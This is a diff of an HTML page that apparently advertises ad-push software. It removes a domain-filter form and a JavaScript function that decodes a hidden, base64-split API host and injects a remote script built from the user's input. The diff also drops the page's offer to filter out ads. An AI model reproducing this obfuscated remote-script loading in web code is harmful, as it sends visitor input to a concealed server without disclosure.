@@ -48,7 +48,7 @@ img{ max-width:100% !important;}
         </h1> 
         <p class="msg">            
             <small style="float:left; color: #444;">  最近更新时间：2024年12月26日 <font color="#E81F1F">V6.0版</font> <font color="#F5E800">软件热卖中</font><img src="/hot.gif"  class="hot" /></small> 
-            <small style="float:right; color: #fdfdfd;"> 您看到的广告是软件自动推送的,如有打扰,请<a href="#bottom">写入过滤名单</a></small>        
+            <small style="float:right; color: #fdfdfd;"> 您看到的广告是软件自动推送的,抱歉打扰</small>        
         </p>
        </div>
     </div>
@@ -79,43 +79,14 @@ img{ max-width:100% !important;}
         <a name="bottom"></a>
 
 
-        <form method="post" >
-        <input type="hidden" name="a" value="guolv" />
-<div>请填写www.开头的域名即可，子域名会自动过滤</div>
-
-<div class="tjqu">
-<table>
-    <tr>
-        <td>过滤域名：</td>
-        <td>   <div class="tjk"> <input autocomplete="off" type="text" name="url" value="www." class="inpurl" id="tjwz" />
-            <input type="button" value="提交" class="btn" onClick="getxia('http://www.zhizhan.net/')"  /></div> </td>
-    </tr>
-
-</table>    
-
-
-
-</div>
-   
-        </form>
-        <div>域名过滤后将不会再推送广告</div>
+      
     </div>
  
  
 </center> 
 
 <script>
-    function getxia(url){
-        var u = document.getElementById("tjwz").value;
-        var base = "aH"+"R0c"+"HM"+"6Ly"+"9hc"+"Gk"+"ucW";
-        var res = $.base64.decode(base+"=");         
-        var oHead = document.getElementsByTagName("HEAD").item(0);
-        var oScript= document.createElement("script");
-        oScript.type = "text/javascript";
-        oScript.src= res+u;
-        oHead.appendChild( oScript);
-        alert( "提交成功:"+ u);
-    }
+ 
 
 </script>
 <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
